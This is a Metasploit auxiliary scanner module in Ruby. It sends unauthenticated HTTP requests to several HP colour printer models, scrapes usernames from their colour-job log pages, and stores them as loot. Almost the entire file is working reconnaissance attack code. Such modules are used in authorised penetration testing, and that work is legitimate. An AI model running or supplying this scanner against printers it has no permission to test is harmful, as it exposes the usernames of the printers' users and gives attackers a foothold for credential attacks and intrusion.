#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'rex/proto/http'
require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'HP CP3525, CP3505, CP3005, and CP4025 color job username exractor',
      'Description'    => %{
        This module scans HP CP3525, CP3505, CP3005, and CP4025 color printers and harvests the usernames from the color job log file.
      },
      'Author'         =>
        [
          'Deral "Percentx" Heiland',
          'Pete "Bokojan" Arzamendi'
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", false]),
        OptInt.new('RPORT', [ true, "The target port", 80]),
        OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20])

      ], self.class)
  end

  def run_host(ip)

    @uri_page = "/hp/device/this.LCDispatcher?nav=hp.ColorUsage"
    
    print_status("Attempting to enumerate usernames from: #{rhost}")

    jobs = get_number_of_jobs(rhost) 
    return if jobs.nil?

    users = get_usernames(jobs)
    return if users.nil?
    
    usernames = ""
    unless users.blank?
      users.each do |user|
        usernames << user << "\n"
      end

      #Woot we got usernames so lets save them.
      print_good( "Found the following users: #{users}")
      loot_name     = "hp.cp.usernames"
      loot_type     = "text/plain"
      loot_filename = "hp-usernames.text"
      loot_desc     = "HP CP Username Harvester"
      p = store_loot(loot_name, loot_type, datastore['RHOST'], usernames , loot_filename, loot_desc)
      print_status("Credentials saved in: #{p.to_s}")
    end
  end


  def get_number_of_jobs(rhost)
    begin
  
      res = send_request_cgi(
        {
          'uri'       => @uri_page,
          'method'    => 'GET'
        },datastore['TIMEOUT'].to_i)

   
      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      print_error("#{rhost}:#{rport} - Connection failed.")
      return
    end
   
    if res == nil
      print_error("#{rhost}:#{rport} - Connection failed.")
      return 
    end
    
    html_body = ::Nokogiri::HTML(res.body) 
    data_to_parse_for_jobs = html_body.xpath('/html/body/table/tbody/tr/td/div/div/div[5]')

    #check to see if the number of jobs is empty. If so return zero my friend.  
    begin
      number_of_jobs = data_to_parse_for_jobs[0].text.scan(/of\s(\d*?)\)/)
      unless number_of_jobs.empty?
        return number_of_jobs[0]
      else
        return number_of_jobs[0] = 0
      end
    rescue
      print_error("Not sure what happend. Need more testing")
      return
    end  
  end

  def get_usernames(jobs)
    pages = jobs[0].to_i
    usernames = []
    while pages >= 0 do 
      user_record_page = "#{@uri_page}&startRecord=#{pages}"
      
      begin
        res = send_request_cgi(
          {
            'uri'       => user_record_page,
            'method'    => 'GET',
          }, datastore['TIMEOUT'].to_i)
      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
        print_error("#{rhost}:#{rport} - Connection failed.")
        return 
      end

      if res == nil
        print_error("#{rhost}:#{rport} - Connection failed.")
        return 
      end
      
      html_body = ::Nokogiri::HTML(res.body)
      data = html_body.xpath('/html/body/table/tbody/tr/td/div/div/table/tr/td[2]')
      data.collect do | line |
        if line.content.strip.empty?
          next
        else
          usernames << line.content.strip
        end
      end
      pages -= 100  
    end
    return usernames.uniq!
  end
end


